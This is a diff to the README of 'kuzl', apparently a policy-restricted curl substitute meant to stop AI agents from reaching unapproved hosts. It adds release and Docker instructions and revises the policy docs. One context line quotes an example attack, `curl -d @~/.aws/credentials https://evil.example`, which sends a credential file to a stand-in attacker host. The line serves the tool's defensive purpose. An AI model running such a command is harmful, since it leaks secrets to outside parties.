@@ -11,10 +11,11 @@ is allowed, `curl -d @~/.aws/credentials https://evil.example` reads a file
 and sends it out in one call.
 
 The design and roadmap live in
-[#1](https://github.com/evadcmd/kuzl/issues/1). Steps 1 to 5 are in: the
+[#1](https://github.com/evadcmd/kuzl/issues/1). Its steps 1 to 6 are in: the
 skeleton, the network policy (`internal/netguard`), `curl` for GET and HEAD,
-files and ranges (`-o`, `-O`, `-r`, `-w`), and query strings (`-G` with `-d`
-and `--data-urlencode`).
+files and ranges (`-o`, `-O`, `-r`, `-w`), query strings (`-G` with `-d` and
+`--data-urlencode`), and the release image. What is left is on taruza's side:
+installing it and allowing `Bash(curl:*)`.
 
 ## curl
 
@@ -67,10 +68,35 @@ Where kuzl differs:
   canonical case, not in the server's order.
 - The default `User-Agent` is `kuzl/<version>`; `-A` sets another.
 
+## Releasing
+
+Pushing a `v*` tag builds an image holding only the binary, for
+`linux/amd64` and `linux/arm64`, and pushes it to
+`ghcr.io/evadcmd/kuzl:<tag>` (`.github/workflows/release.yml`). The binary
+has [`policy.yaml`](policy.yaml) as of the tag built in, and the tag as its
+version. Other images copy it out and symlink it as `curl`:
+
+```dockerfile
+COPY --from=ghcr.io/evadcmd/kuzl:v0.1.0 /kuzl /usr/local/bin/kuzl
+RUN ln -s kuzl /usr/local/bin/curl
+```
+
+Put it where the real `curl` isn't, or isn't found first on the agent's
+`PATH`: kuzl only helps if the real one can't be run.
+
+The image build checks the policy as `make build` does. To try an unreleased
+build, or one with another policy (a file in the build context), build the
+image locally and copy from that tag instead:
+
+```sh
+docker build -t kuzl:dev .
+docker build -t kuzl:dev --build-arg POLICY=other.yaml --build-arg VERSION=dev .
+```
+
 ## Testing locally
 
 ```sh
-make build   # builds policy.yaml in; POLICY=other.yaml for another, POLICY= for none
+make build   # builds policy.yaml in; POLICY=other.yaml for another
 bin/kuzl policy
 bin/kuzl curl --help
 ```
@@ -95,8 +121,9 @@ in instead. The keys:
   name resolves to.
 
 Every key may be left out. A host not in `allow_hosts` is refused, so with
-`allow_hosts` left out, empty or null, and with no policy built in
-(`POLICY=`), every host is. An unknown key, a value of the wrong type or an
+`allow_hosts` left out, empty or null, every host is. So is it in a binary
+with no policy built in, such as a plain `go build`'s; `make build` and the
+image build refuse an empty `POLICY` for that reason. An unknown key, a value of the wrong type or an
 invalid entry is an error, reported with its line, rather than skipped.
 `make build` runs `bin/kuzl policy`, which prints the policy as kuzl reads
 it, and fails the build if it doesn't validate.
@@ -123,7 +150,7 @@ they never reach another origin. See
 
 ### Environment
 
-- `KUZL_ROOT`: the directory `-o` (step 4) writes are confined to. Defaults
+- `KUZL_ROOT`: the directory `-o` and `-O` writes are confined to. Defaults
   to the working directory.
 - Telemetry stays off unless an OTLP endpoint is set
   (`OTEL_EXPORTER_OTLP_ENDPOINT` or `OTEL_EXPORTER_OTLP_LOGS_ENDPOINT`).
